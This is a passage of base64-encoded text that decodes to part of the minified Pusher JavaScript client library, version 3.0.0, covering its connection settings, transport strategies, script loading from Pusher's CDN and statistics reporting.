SxmdW5jdGlvbigpe1B1c2hlci5WRVJTSU9OPSIzLjAuMCIsUHVzaGVyLlBST1RPQ09MPTcsUHVzaGVyLmhvc3Q9IndzLnB1c2hlcmFwcC5jb20iLFB1c2hlci53c19wb3J0PTgwLFB1c2hlci53c3NfcG9ydD00NDMsUHVzaGVyLnNvY2tqc19ob3N0PSJzb2NranMucHVzaGVyLmNvbSIsUHVzaGVyLnNvY2tqc19odHRwX3BvcnQ9ODAsUHVzaGVyLnNvY2tqc19odHRwc19wb3J0PTQ0MyxQdXNoZXIuc29ja2pzX3BhdGg9Ii9wdXNoZXIiLFB1c2hlci5zdGF0c19ob3N0PSJzdGF0cy5wdXNoZXIuY29tIixQdXNoZXIuY2hhbm5lbF9hdXRoX2VuZHBvaW50PSIvcHVzaGVyL2F1dGgiLFB1c2hlci5jaGFubmVsX2F1dGhfdHJhbnNwb3J0PSJhamF4IixQdXNoZXIuYWN0aXZpdHlfdGltZW91dD0xMmU0LFB1c2hlci5wb25nX3RpbWVvdXQ9M2U0LFB1c2hlci51bmF2YWlsYWJsZV90aW1lb3V0PTFlNCxQdXNoZXIuY2RuX2h0dHA9Imh0dHA6Ly9qcy5wdXNoZXIuY29tLyIsUHVzaGVyLmNkbl9odHRwcz0iaHR0cHM6Ly9qcy5wdXNoZXIuY29tLyIsUHVzaGVyLmRlcGVuZGVuY3lfc3VmZml4PSIiLFB1c2hlci5nZXREZWZhdWx0U3RyYXRlZ3k9ZnVuY3Rpb24oZSl7dmFyIHQ7cmV0dXJuIHQ9ZS5lbmNyeXB0ZWQ/WyI6YmVzdF9jb25uZWN0ZWRfZXZlciIsIjp3c19sb29wIixbIjpkZWxheWVkIiwyZTMsWyI6aHR0cF9mYWxsYmFja19sb29wIl1dXTpbIjpiZXN0X2Nvbm5lY3RlZF9ldmVyIiwiOndzX2xvb3AiLFsiOmRlbGF5ZWQiLDJlMyxbIjp3c3NfbG9vcCJdXSxbIjpkZWxheWVkIiw1ZTMsWyI6aHR0cF9mYWxsYmFja19sb29wIl1dXSxbWyI6ZGVmIiwid3Nfb3B0aW9ucyIse2hvc3RVbmVuY3J5cHRlZDplLndzSG9zdCsiOiIrZS53c1BvcnQsaG9zdEVuY3J5cHRlZDplLndzSG9zdCsiOiIrZS53c3NQb3J0fV0sWyI6ZGVmIiwid3NzX29wdGlvbnMiLFsiOmV4dGVuZCIsIjp3c19vcHRpb25zIix7ZW5jcnlwdGVkOiEwfV1dLFsiOmRlZiIsInNvY2tqc19vcHRpb25zIix7aG9zdFVuZW5jcnlwdGVkOmUuaHR0cEhvc3QrIjoiK2UuaHR0cFBvcnQsaG9zdEVuY3J5cHRlZDplLmh0dHBIb3N0KyI6IitlLmh0dHBzUG9ydCxodHRwUGF0aDplLmh0dHBQYXRofV0sWyI6ZGVmIiwidGltZW91dHMiLHtsb29wOiEwLHRpbWVvdXQ6MTVlMyx0aW1lb3V0TGltaXQ6NmU0fV0sWyI6ZGVmIiwid3NfbWFuYWdlciIsWyI6dHJhbnNwb3J0X21hbmFnZXIiLHtsaXZlczoyLG1pblBpbmdEZWxheToxZTQsbWF4UGluZ0RlbGF5OmUuYWN0aXZpdHlfdGltZW91dH1dXSxbIjpkZWYiLCJzdHJlYW1pbmdfbWFuYWdlciIsWyI6dHJhbnNwb3J0X21hbmFnZXIiLHtsaXZlczoyLG1pblBpbmdEZWxheToxZTQsbWF4UGluZ0RlbGF5OmUuYWN0aXZpdHlfdGltZW91dH1dXSxbIjpkZWZfdHJhbnNwb3J0Iiwid3MiLCJ3cyIsMywiOndzX29wdGlvbnMiLCI6d3NfbWFuYWdlciJdLFsiOmRlZl90cmFuc3BvcnQiLCJ3c3MiLCJ3cyIsMywiOndzc19vcHRpb25zIiwiOndzX21hbmFnZXIiXSxbIjpkZWZfdHJhbnNwb3J0Iiwic29ja2pzIiwic29ja2pzIiwxLCI6c29ja2pzX29wdGlvbnMiXSxbIjpkZWZfdHJhbnNwb3J0IiwieGhyX3N0cmVhbWluZyIsInhocl9zdHJlYW1pbmciLDEsIjpzb2NranNfb3B0aW9ucyIsIjpzdHJlYW1pbmdfbWFuYWdlciJdLFsiOmRlZl90cmFuc3BvcnQiLCJ4ZHJfc3RyZWFtaW5nIiwieGRyX3N0cmVhbWluZyIsMSwiOnNvY2tqc19vcHRpb25zIiwiOnN0cmVhbWluZ19tYW5hZ2VyIl0sWyI6ZGVmX3RyYW5zcG9ydCIsInhocl9wb2xsaW5nIiwieGhyX3BvbGxpbmciLDEsIjpzb2NranNfb3B0aW9ucyJdLFsiOmRlZl90cmFuc3BvcnQiLCJ4ZHJfcG9sbGluZyIsInhkcl9wb2xsaW5nIiwxLCI6c29ja2pzX29wdGlvbnMiXSxbIjpkZWYiLCJ3c19sb29wIixbIjpzZXF1ZW50aWFsIiwiOnRpbWVvdXRzIiwiOndzIl1dLFsiOmRlZiIsIndzc19sb29wIixbIjpzZXF1ZW50aWFsIiwiOnRpbWVvdXRzIiwiOndzcyJdXSxbIjpkZWYiLCJzb2NranNfbG9vcCIsWyI6c2VxdWVudGlhbCIsIjp0aW1lb3V0cyIsIjpzb2NranMiXV0sWyI6ZGVmIiwic3RyZWFtaW5nX2xvb3AiLFsiOnNlcXVlbnRpYWwiLCI6dGltZW91dHMiLFsiOmlmIixbIjppc19zdXBwb3J0ZWQiLCI6eGhyX3N0cmVhbWluZyJdLCI6eGhyX3N0cmVhbWluZyIsIjp4ZHJfc3RyZWFtaW5nIl1dXSxbIjpkZWYiLCJwb2xsaW5nX2xvb3AiLFsiOnNlcXVlbnRpYWwiLCI6dGltZW91dHMiLFsiOmlmIixbIjppc19zdXBwb3J0ZWQiLCI6eGhyX3BvbGxpbmciXSwiOnhocl9wb2xsaW5nIiwiOnhkcl9wb2xsaW5nIl1dXSxbIjpkZWYiLCJodHRwX2xvb3AiLFsiOmlmIixbIjppc19zdXBwb3J0ZWQiLCI6c3RyZWFtaW5nX2xvb3AiXSxbIjpiZXN0X2Nvbm5lY3RlZF9ldmVyIiwiOnN0cmVhbWluZ19sb29wIixbIjpkZWxheWVkIiw0ZTMsWyI6cG9sbGluZ19sb29wIl1dXSxbIjpwb2xsaW5nX2xvb3AiXV1dLFsiOmRlZiIsImh0dHBfZmFsbGJhY2tfbG9vcCIsWyI6aWYiLFsiOmlzX3N1cHBvcnRlZCIsIjpodHRwX2xvb3AiXSxbIjpodHRwX2xvb3AiXSxbIjpzb2NranNfbG9vcCJdXV0sWyI6ZGVmIiwic3RyYXRlZ3kiLFsiOmNhY2hlZCIsMThlNSxbIjpmaXJzdF9jb25uZWN0ZWQiLFsiOmlmIixbIjppc19zdXBwb3J0ZWQiLCI6d3MiXSx0LCI6aHR0cF9mYWxsYmFja19sb29wIl1dXV1dfX0uY2FsbCh0aGlzKSxmdW5jdGlvbigpe1B1c2hlci5nZXRHbG9iYWxDb25maWc9ZnVuY3Rpb24oKXtyZXR1cm57d3NIb3N0OlB1c2hlci5ob3N0LHdzUG9ydDpQdXNoZXIud3NfcG9ydCx3c3NQb3J0OlB1c2hlci53c3NfcG9ydCxodHRwSG9zdDpQdXNoZXIuc29ja2pzX2hvc3QsaHR0cFBvcnQ6UHVzaGVyLnNvY2tqc19odHRwX3BvcnQsaHR0cHNQb3J0OlB1c2hlci5zb2NranNfaHR0cHNfcG9ydCxodHRwUGF0aDpQdXNoZXIuc29ja2pzX3BhdGgsc3RhdHNIb3N0OlB1c2hlci5zdGF0c19ob3N0LGF1dGhFbmRwb2ludDpQdXNoZXIuY2hhbm5lbF9hdXRoX2VuZHBvaW50LGF1dGhUcmFuc3BvcnQ6UHVzaGVyLmNoYW5uZWxfYXV0aF90cmFuc3BvcnQsYWN0aXZpdHlfdGltZW91dDpQdXNoZXIuYWN0aXZpdHlfdGltZW91dCxwb25nX3RpbWVvdXQ6UHVzaGVyLnBvbmdfdGltZW91dCx1bmF2YWlsYWJsZV90aW1lb3V0OlB1c2hlci51bmF2YWlsYWJsZV90aW1lb3V0fX0sUHVzaGVyLmdldENsdXN0ZXJDb25maWc9ZnVuY3Rpb24oZSl7cmV0dXJue3dzSG9zdDoid3MtIitlKyIucHVzaGVyLmNvbSIsaHR0cEhvc3Q6InNvY2tqcy0iK2UrIi5wdXNoZXIuY29tIn19fS5jYWxsKHRoaXMpLGZ1bmN0aW9uKCl7ZnVuY3Rpb24gZShlKXt2YXIgdD1mdW5jdGlvbih0KXtFcnJvci5jYWxsKHRoaXMsdCksdGhpcy5uYW1lPWV9O3JldHVybiBQdXNoZXIuVXRpbC5leHRlbmQodC5wcm90b3R5cGUsRXJyb3IucHJvdG90eXBlKSx0fVB1c2hlci5FcnJvcnM9e0JhZEV2ZW50TmFtZTplKCJCYWRFdmVudE5hbWUiKSxSZXF1ZXN0VGltZWRPdXQ6ZSgiUmVxdWVzdFRpbWVkT3V0IiksVHJhbnNwb3J0UHJpb3JpdHlUb29Mb3c6ZSgiVHJhbnNwb3J0UHJpb3JpdHlUb29Mb3ciKSxUcmFuc3BvcnRDbG9zZWQ6ZSgiVHJhbnNwb3J0Q2xvc2VkIiksVW5zdXBwb3J0ZWRUcmFuc3BvcnQ6ZSgiVW5zdXBwb3J0ZWRUcmFuc3BvcnQiKSxVbnN1cHBvcnRlZFN0cmF0ZWd5OmUoIlVuc3VwcG9ydGVkU3RyYXRlZ3kiKX19LmNhbGwodGhpcyksZnVuY3Rpb24oKXtmdW5jdGlvbiBlKGUpe3RoaXMuY2FsbGJhY2tzPW5ldyB0LHRoaXMuZ2xvYmFsX2NhbGxiYWNrcz1bXSx0aGlzLmZhaWxUaHJvdWdoPWV9ZnVuY3Rpb24gdCgpe3RoaXMuX2NhbGxiYWNrcz17fX1mdW5jdGlvbiBuKGUpe3JldHVybiJfIitlfXZhciByPWUucHJvdG90eXBlO3IuYmluZD1mdW5jdGlvbihlLHQsbil7cmV0dXJuIHRoaXMuY2FsbGJhY2tzLmFkZChlLHQsbiksdGhpc30sci5iaW5kX2FsbD1mdW5jdGlvbihlKXtyZXR1cm4gdGhpcy5nbG9iYWxfY2FsbGJhY2tzLnB1c2goZSksdGhpc30sci51bmJpbmQ9ZnVuY3Rpb24oZSx0LG4pe3JldHVybiB0aGlzLmNhbGxiYWNrcy5yZW1vdmUoZSx0LG4pLHRoaXN9LHIudW5iaW5kX2FsbD1mdW5jdGlvbihlLHQpe3JldHVybiB0aGlzLmNhbGxiYWNrcy5yZW1vdmUoZSx0KSx0aGlzfSxyLmVtaXQ9ZnVuY3Rpb24oZSx0KXt2YXIgbjtmb3Iobj0wO248dGhpcy5nbG9iYWxfY2FsbGJhY2tzLmxlbmd0aDtuKyspdGhpcy5nbG9iYWxfY2FsbGJhY2tzW25dKGUsdCk7dmFyIHI9dGhpcy5jYWxsYmFja3MuZ2V0KGUpO2lmKHImJnIubGVuZ3RoPjApZm9yKG49MDtuPHIubGVuZ3RoO24rKylyW25dLmZuLmNhbGwocltuXS5jb250ZXh0fHx3aW5kb3csdCk7ZWxzZSB0aGlzLmZhaWxUaHJvdWdoJiZ0aGlzLmZhaWxUaHJvdWdoKGUsdCk7cmV0dXJuIHRoaXN9LHQucHJvdG90eXBlLmdldD1mdW5jdGlvbihlKXtyZXR1cm4gdGhpcy5fY2FsbGJhY2tzW24oZSldfSx0LnByb3RvdHlwZS5hZGQ9ZnVuY3Rpb24oZSx0LHIpe3ZhciBpPW4oZSk7dGhpcy5fY2FsbGJhY2tzW2ldPXRoaXMuX2NhbGxiYWNrc1tpXXx8W10sdGhpcy5fY2FsbGJhY2tzW2ldLnB1c2goe2ZuOnQsY29udGV4dDpyfSl9LHQucHJvdG90eXBlLnJlbW92ZT1mdW5jdGlvbihlLHQscil7aWYoIWUmJiF0JiYhcilyZXR1cm4gdm9pZCh0aGlzLl9jYWxsYmFja3M9e30pO3ZhciBpPWU/W24oZSldOlB1c2hlci5VdGlsLmtleXModGhpcy5fY2FsbGJhY2tzKTt0fHxyP1B1c2hlci5VdGlsLmFwcGx5KGksZnVuY3Rpb24oZSl7dGhpcy5fY2FsbGJhY2tzW2VdPVB1c2hlci5VdGlsLmZpbHRlcih0aGlzLl9jYWxsYmFja3NbZV18fFtdLGZ1bmN0aW9uKGUpe3JldHVybiB0JiZ0IT09ZS5mbnx8ciYmciE9PWUuY29udGV4dH0pLDA9PT10aGlzLl9jYWxsYmFja3NbZV0ubGVuZ3RoJiZkZWxldGUgdGhpcy5fY2FsbGJhY2tzW2VdfSx0aGlzKTpQdXNoZXIuVXRpbC5hcHBseShpLGZ1bmN0aW9uKGUpe2RlbGV0ZSB0aGlzLl9jYWxsYmFja3NbZV19LHRoaXMpfSxQdXNoZXIuRXZlbnRzRGlzcGF0Y2hlcj1lfS5jYWxsKHRoaXMpLGZ1bmN0aW9uKCl7ZnVuY3Rpb24gZShlLHQpe3RoaXMubGFzdElkPTAsdGhpcy5wcmVmaXg9ZSx0aGlzLm5hbWU9dH12YXIgdD1lLnByb3RvdHlwZTt0LmNyZWF0ZT1mdW5jdGlvbihlKXt0aGlzLmxhc3RJZCsrO3ZhciB0PXRoaXMubGFzdElkLG49dGhpcy5wcmVmaXgrdCxyPXRoaXMubmFtZSsiWyIrdCsiXSIsaT0hMSxzPWZ1bmN0aW9uKCl7aXx8KGUuYXBwbHkobnVsbCxhcmd1bWVudHMpLGk9ITApfTtyZXR1cm4gdGhpc1t0XT1zLHtudW1iZXI6dCxpZDpuLG5hbWU6cixjYWxsYmFjazpzfX0sdC5yZW1vdmU9ZnVuY3Rpb24oZSl7ZGVsZXRlIHRoaXNbZS5udW1iZXJdfSxQdXNoZXIuU2NyaXB0UmVjZWl2ZXJGYWN0b3J5PWUsUHVzaGVyLlNjcmlwdFJlY2VpdmVycz1uZXcgZSgiX3B1c2hlcl9zY3JpcHRfIiwiUHVzaGVyLlNjcmlwdFJlY2VpdmVycyIpfS5jYWxsKHRoaXMpLGZ1bmN0aW9uKCl7ZnVuY3Rpb24gZShlKXt0aGlzLnNyYz1lfXZhciB0PWUucHJvdG90eXBlO3Quc2VuZD1mdW5jdGlvbihlKXt2YXIgdD10aGlzLG49IkVycm9yIGxvYWRpbmcgIit0LnNyYzt0LnNjcmlwdD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKSx0LnNjcmlwdC5pZD1lLmlkLHQuc2NyaXB0LnNyYz10LnNyYyx0LnNjcmlwdC50eXBlPSJ0ZXh0L2phdmFzY3JpcHQiLHQuc2NyaXB0LmNoYXJzZXQ9IlVURi04Iix0LnNjcmlwdC5hZGRFdmVudExpc3RlbmVyPyh0LnNjcmlwdC5vbmVycm9yPWZ1bmN0aW9uKCl7ZS5jYWxsYmFjayhuKX0sdC5zY3JpcHQub25sb2FkPWZ1bmN0aW9uKCl7ZS5jYWxsYmFjayhudWxsKX0pOnQuc2NyaXB0Lm9ucmVhZHlzdGF0ZWNoYW5nZT1mdW5jdGlvbigpeyJsb2FkZWQiIT09dC5zY3JpcHQucmVhZHlTdGF0ZSYmImNvbXBsZXRlIiE9PXQuc2NyaXB0LnJlYWR5U3RhdGV8fGUuY2FsbGJhY2sobnVsbCl9LHZvaWQgMD09PXQuc2NyaXB0LmFzeW5jJiZkb2N1bWVudC5hdHRhY2hFdmVudCYmL29wZXJhL2kudGVzdChuYXZpZ2F0b3IudXNlckFnZW50KT8odC5lcnJvclNjcmlwdD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKSx0LmVycm9yU2NyaXB0LmlkPWUuaWQrIl9lcnJvciIsdC5lcnJvclNjcmlwdC50ZXh0PWUubmFtZSsiKCciK24rIicpOyIsdC5zY3JpcHQuYXN5bmM9dC5lcnJvclNjcmlwdC5hc3luYz0hMSk6dC5zY3JpcHQuYXN5bmM9ITA7dmFyIHI9ZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoImhlYWQiKVswXTtyLmluc2VydEJlZm9yZSh0LnNjcmlwdCxyLmZpcnN0Q2hpbGQpLHQuZXJyb3JTY3JpcHQmJnIuaW5zZXJ0QmVmb3JlKHQuZXJyb3JTY3JpcHQsdC5zY3JpcHQubmV4dFNpYmxpbmcpfSx0LmNsZWFudXA9ZnVuY3Rpb24oKXt0aGlzLnNjcmlwdCYmKHRoaXMuc2NyaXB0Lm9ubG9hZD10aGlzLnNjcmlwdC5vbmVycm9yPW51bGwsdGhpcy5zY3JpcHQub25yZWFkeXN0YXRlY2hhbmdlPW51bGwpLHRoaXMuc2NyaXB0JiZ0aGlzLnNjcmlwdC5wYXJlbnROb2RlJiZ0aGlzLnNjcmlwdC5wYXJlbnROb2RlLnJlbW92ZUNoaWxkKHRoaXMuc2NyaXB0KSx0aGlzLmVycm9yU2NyaXB0JiZ0aGlzLmVycm9yU2NyaXB0LnBhcmVudE5vZGUmJnRoaXMuZXJyb3JTY3JpcHQucGFyZW50Tm9kZS5yZW1vdmVDaGlsZCh0aGlzLmVycm9yU2NyaXB0KSx0aGlzLnNjcmlwdD1udWxsLHRoaXMuZXJyb3JTY3JpcHQ9bnVsbH0sUHVzaGVyLlNjcmlwdFJlcXVlc3Q9ZX0uY2FsbCh0aGlzKSxmdW5jdGlvbigpe2Z1bmN0aW9uIGUoZSl7dGhpcy5vcHRpb25zPWUsdGhpcy5yZWNlaXZlcnM9ZS5yZWNlaXZlcnN8fFB1c2hlci5TY3JpcHRSZWNlaXZlcnMsdGhpcy5sb2FkaW5nPXt9fXZhciB0PWUucHJvdG90eXBlO3QubG9hZD1mdW5jdGlvbihlLHQsbil7dmFyIHI9dGhpcztpZihyLmxvYWRpbmdbZV0mJnIubG9hZGluZ1tlXS5sZW5ndGg+MClyLmxvYWRpbmdbZV0ucHVzaChuKTtlbHNle3IubG9hZGluZ1tlXT1bbl07dmFyIGk9bmV3IFB1c2hlci5TY3JpcHRSZXF1ZXN0KHIuZ2V0UGF0aChlLHQpKSxzPXIucmVjZWl2ZXJzLmNyZWF0ZShmdW5jdGlvbih0KXtpZihyLnJlY2VpdmVycy5yZW1vdmUocyksci5sb2FkaW5nW2VdKXt2YXIgbj1yLmxvYWRpbmdbZV07ZGVsZXRlIHIubG9hZGluZ1tlXTtmb3IodmFyIG89ZnVuY3Rpb24oZSl7ZXx8aS5jbGVhbnVwKCl9LGE9MDthPG4ubGVuZ3RoO2ErKyluW2FdKHQsbyl9fSk7aS5zZW5kKHMpfX0sdC5nZXRSb290PWZ1bmN0aW9uKGUpe3ZhciB0LG49UHVzaGVyLlV0aWwuZ2V0RG9jdW1lbnQoKS5sb2NhdGlvbi5wcm90b2NvbDtyZXR1cm4gdD1lJiZlLmVuY3J5cHRlZHx8Imh0dHBzOiI9PT1uP3RoaXMub3B0aW9ucy5jZG5faHR0cHM6dGhpcy5vcHRpb25zLmNkbl9odHRwLHQucmVwbGFjZSgvXC8qJC8sIiIpKyIvIit0aGlzLm9wdGlvbnMudmVyc2lvbn0sdC5nZXRQYXRoPWZ1bmN0aW9uKGUsdCl7cmV0dXJuIHRoaXMuZ2V0Um9vdCh0KSsiLyIrZSt0aGlzLm9wdGlvbnMuc3VmZml4KyIuanMifSxQdXNoZXIuRGVwZW5kZW5jeUxvYWRlcj1lfS5jYWxsKHRoaXMpLGZ1bmN0aW9uKCl7ZnVuY3Rpb24gZSgpe1B1c2hlci5yZWFkeSgpfWZ1bmN0aW9uIHQoZSl7ZG9jdW1lbnQuYm9keT9lKCk6c2V0VGltZW91dChmdW5jdGlvbigpe3QoZSl9LDApfWZ1bmN0aW9uIG4oKXt0KGUpfVB1c2hlci5EZXBlbmRlbmNpZXNSZWNlaXZlcnM9bmV3IFB1c2hlci5TY3JpcHRSZWNlaXZlckZhY3RvcnkoIl9wdXNoZXJfZGVwZW5kZW5jaWVzIiwiUHVzaGVyLkRlcGVuZGVuY2llc1JlY2VpdmVycyIpLFB1c2hlci5EZXBlbmRlbmNpZXM9bmV3IFB1c2hlci5EZXBlbmRlbmN5TG9hZGVyKHtjZG5faHR0cDpQdXNoZXIuY2RuX2h0dHAsY2RuX2h0dHBzOlB1c2hlci5jZG5faHR0cHMsdmVyc2lvbjpQdXNoZXIuVkVSU0lPTixzdWZmaXg6UHVzaGVyLmRlcGVuZGVuY3lfc3VmZml4LHJlY2VpdmVyczpQdXNoZXIuRGVwZW5kZW5jaWVzUmVjZWl2ZXJzfSksd2luZG93LkpTT04/bigpOlB1c2hlci5EZXBlbmRlbmNpZXMubG9hZCgianNvbjIiLHt9LG4pfSgpLGZ1bmN0aW9uKCl7Zm9yKHZhciBlPXtlbmNvZGU6ZnVuY3Rpb24oZSl7cmV0dXJuIGMoYShlKSl9fSx0PVN0cmluZy5mcm9tQ2hhckNvZGUsbj0iQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkrLyIscj17fSxpPTAscz1uLmxlbmd0aDtzPmk7aSsrKXJbbi5jaGFyQXQoaSldPWk7dmFyIG89ZnVuY3Rpb24oZSl7dmFyIG49ZS5jaGFyQ29kZUF0KDApO3JldHVybiAxMjg+bj9lOjIwNDg+bj90KDE5MnxuPj4+NikrdCgxMjh8NjMmbik6dCgyMjR8bj4+PjEyJjE1KSt0KDEyOHxuPj4+NiY2MykrdCgxMjh8NjMmbil9LGE9ZnVuY3Rpb24oZSl7cmV0dXJuIGUucmVwbGFjZSgvW15ceDAwLVx4N0ZdL2csbyl9LHU9ZnVuY3Rpb24oZSl7dmFyIHQ9WzAsMiwxXVtlLmxlbmd0aCUzXSxyPWUuY2hhckNvZGVBdCgwKTw8MTZ8KGUubGVuZ3RoPjE/ZS5jaGFyQ29kZUF0KDEpOjApPDw4fChlLmxlbmd0aD4yP2UuY2hhckNvZGVBdCgyKTowKSxpPVtuLmNoYXJBdChyPj4+MTgpLG4uY2hhckF0KHI+Pj4xMiY2MyksdD49Mj8iPSI6bi5jaGFyQXQocj4+PjYmNjMpLHQ+PTE/Ij0iOm4uY2hhckF0KDYzJnIpXTtyZXR1cm4gaS5qb2luKCIiKX0sYz13aW5kb3cuYnRvYXx8ZnVuY3Rpb24oZSl7cmV0dXJuIGUucmVwbGFjZSgvW1xzXFNdezEsM30vZyx1KX07UHVzaGVyLkJhc2U2ND1lfS5jYWxsKHRoaXMpLGZ1bmN0aW9uKCl7ZnVuY3Rpb24gZShlLHQpe3RoaXMudXJsPWUsdGhpcy5kYXRhPXR9ZnVuY3Rpb24gdChlKXtyZXR1cm4gUHVzaGVyLlV0aWwubWFwT2JqZWN0KGUsZnVuY3Rpb24oZSl7cmV0dXJuIm9iamVjdCI9PXR5cGVvZiBlJiYoZT1KU09OLnN0cmluZ2lmeShlKSksZW5jb2RlVVJJQ29tcG9uZW50KFB1c2hlci5CYXNlNjQuZW5jb2RlKGUudG9TdHJpbmcoKSkpfSl9dmFyIG49ZS5wcm90b3R5cGU7bi5zZW5kPWZ1bmN0aW9uKGUpe2lmKCF0aGlzLnJlcXVlc3Qpe3ZhciBuPVB1c2hlci5VdGlsLmZpbHRlck9iamVjdCh0aGlzLmRhdGEsZnVuY3Rpb24oZSl7cmV0dXJuIHZvaWQgMCE9PWV9KSxyPVB1c2hlci5VdGlsLm1hcChQdXNoZXIuVXRpbC5mbGF0dGVuKHQobikpLFB1c2hlci5VdGlsLm1ldGhvZCgiam9pbiIsIj0iKSkuam9pbigiJiIpLGk9dGhpcy51cmwrIi8iK2UubnVtYmVyKyI/IityO3RoaXMucmVxdWVzdD1uZXcgUHVzaGVyLlNjcmlwdFJlcXVlc3QoaSksdGhpcy5yZXF1ZXN0LnNlbmQoZSl9fSxuLmNsZWFudXA9ZnVuY3Rpb24oKXt0aGlzLnJlcXVlc3QmJnRoaXMucmVxdWVzdC5jbGVhbnVwKCl9LFB1c2hlci5KU09OUFJlcXVlc3Q9ZX0uY2FsbCh0aGlzKSxmdW5jdGlvbigpe2Z1bmN0aW9uIGUoZSx0LG4pe3RoaXMua2V5PWUsdGhpcy5zZXNzaW9uPXQsdGhpcy5ldmVudHM9W10sdGhpcy5vcHRpb25zPW58fHt9LHRoaXMuc2VudD0wLHRoaXMudW5pcXVlSUQ9MH12YXIgdD1lLnByb3RvdHlwZTtlLkVSUk9SPTMsZS5JTkZPPTYsZS5ERUJVRz03LHQubG9nPWZ1bmN0aW9uKGUsdCl7ZTw9dGhpcy5vcHRpb25zLmxldmVsJiYodGhpcy5ldmVudHMucHVzaChQdXNoZXIuVXRpbC5leHRlbmQoe30sdCx7dGltZXN0YW1wOlB1c2hlci5VdGlsLm5vdygpfSkpLHRoaXMub3B0aW9ucy5saW1pdCYmdGhpcy5ldmVudHMubGVuZ3RoPnRoaXMub3B0aW9ucy5saW1pdCYmdGhpcy5ldmVudHMuc2hpZnQoKSl9LHQuZXJyb3I9ZnVuY3Rpb24odCl7dGhpcy5sb2coZS5FUlJPUix0KX0sdC5pbmZvPWZ1bmN0aW9uKHQpe3RoaXMubG9nKGUuSU5GTyx0KX0sdC5kZWJ1Zz1mdW5jdGlvbih0KXt0aGlzLmxvZyhlLkRFQlVHLHQpfSx0LmlzRW1wdHk9ZnVuY3Rpb24oKXtyZXR1cm4gMD09PXRoaXMuZXZlbnRzLmxlbmd0aH0sdC5zZW5kPWZ1bmN0aW9uKGUsdCl7dmFyIG49dGhpcyxyPVB1c2hlci5VdGlsLmV4dGVuZCh7c2Vzc2lvbjpuLnNlc3Npb24sYnVuZGxlOm4uc2VudCsxLGtleTpuLmtleSxsaWI6ImpzIix2ZXJzaW9uOm4ub3B0aW9ucy52ZXJzaW9uLGNsdXN0ZXI6bi5vcHRpb25zLmNsdXN0ZXIsZmVhdHVyZXM6bi5vcHRpb25zLmZlYXR1cmVzLHRpbWVsaW5lOm4uZXZlbnRzfSxuLm9wdGlvbnMucGFyYW1zKTtyZXR1cm4gbi5ldmVudHM9W10sZShyLGZ1bmN0aW9uKGUscil7ZXx8bi5zZW50KyssdCYmdChlLHIpfSksITB9LHQuZ2VuZXJhdGVVbmlxdWVJRD1mdW5jdGlvbigpe3JldHVybiB0aGlzLnVuaXF1ZUlEKyssdGhpcy51bmlxdWVJRH0sUHVzaGVyLlRpbWVsaW5lPWV9LmNhbGwodGhpcyksZnVuY3Rpb24oKXtmdW5jdGlvbiBlKGUsdCl7dGhpcy50aW1lbGluZT1lLHRoaXMub3B0aW9ucz10fHx7fX12YXIgdD1lLnByb3RvdHlwZTt0LnNlbmQ9ZnVuY3Rpb24oZSx0KXt2YXIgbj10aGlzO2lmKCFuLnRpbWVsaW5lLmlzRW1wdHkoKSl7dmFyIHI9ZnVuY3Rpb24odCxyKXt2YXIgaT0iaHR0cCIrKGU/InMiOiIiKSsiOi8vIixzPWkrKG4uaG9zdHx8bi5vcHRpb25zLmhvc3QpK24ub3B0aW9ucy5wYXRoLG89bmV3IFB1c2hlci5KU09OUFJlcXVlc3Qocyx0KSxhPVB1c2hlci5TY3JpcHRSZWNlaXZlcnMuY3JlYXRlKGZ1bmN0aW9uKGUsdCl7UHVzaGVyLlNjcmlwdFJlY2VpdmVycy5yZW1vdmUoYSksby5jbGVhbnVwKCksdCYmdC5ob3N0JiYobi5ob3N0PXQuaG9zdCksciYmcihlLHQpfSk7by5zZW5kKGEpfTtuLnRpbWVsaW5lLnNlbmQocix0KX19LFB1c2hlci5UaW1lbGluZVNlbmRlcj1lfS5jYWxsKHRoaXMpLGZ1bmN0aW9uKCl7ZnVuY3Rpb24gZShlKXt0aGlzLnN0cmF0ZWdpZXM9ZX1mdW5jdGlvbiB0KGUsdCxuKXt2YXIgaT1QdXNoZXIuVXRpbC5tYXAoZSxmdW5jdGlvbihlLHIsaSxzKXtyZXR1cm4gZS5jb25uZWN0KHQsbihyLHMpKX0pO3JldHVybnthYm9ydDpmdW5jdGlvbigpe1B1c2hlci5VdGlsLmFwcGx5KGkscil9LGZvcmNlTWluUHJpb3JpdHk6ZnVuY3Rpb24oZSl7UHVzaGVyLlV0aWwuYXBwbHkoaSxmdW5jdGlvbih0KXt0LmZvcmNlTWluUHJpb3JpdHkoZSl9KX19fWZ1bmN0aW9uIG4oZSl7cmV0dXJuIFB1c2hlci5VdGlsLmFsbChlLGZ1bmN0aW9uKGUpe3JldHVybiBCb29sZWFuKGUuZXJyb3IpfSl9ZnVuY3Rpb24gcihlKXtlLmVycm9yfHxlLmFib3J0ZWR8fChlLmFib3J0KCksZS5hYm9ydGVkPSEwKX12YXIgaT1lLnByb3RvdHlwZTtpLmlzU3VwcG9ydGVkPWZ1bmN0aW9uKCl7cmV0dXJuIFB1c2hlci5VdGlsLmFueSh0aGlzLnN0cmF0ZWdpZXMsUHVzaGVyLlV0aWwubWV0aG9kKCJpc1N1cHBvcnRlZCIpKX0saS5jb25uZWN0PWZ1bmN0aW9uKGUscil7cmV0dXJuIHQodGhpcy5zdHJhdGVnaWVzLGUsZnVuY3Rpb24oZSx0KXtyZXR1cm4gZnVuY3Rpb24oaSxzKXtyZXR1cm4gdFtlXS5lcnJvcj1pLGk/dm9pZChuKHQpJiZyKCEwKSk6KFB1c2hlci5VdGlsLmFwcGx5KHQsZnVuY3Rpb24oZSl7ZS5mb3JjZU1pblByaW9yaXR5KHMudHJhbnNwb3J0LnByaW9yaXR5KX0pLHZvaWQgcihudWxsLHMpKX19KX0sUHVzaGVyLkJlc3RDb25uZWN0ZWRFdmVyU3RyYXRlZ3k9ZX0uY2FsbCh0aGlzKSxmdW5jdGlvbigpe2Z1bmN0aW9uIGUoZSx0LG4pe3RoaXMuc3RyYXRlZ3k9ZSx0aGlzLnRyYW5zcG9ydHM9dCx0aGlzLnR0bD1uLnR0bHx8MThlNSx0aGlzLmVuY3J5cHRlZD1uLmVuY3J5cHRlZCx0aGlzL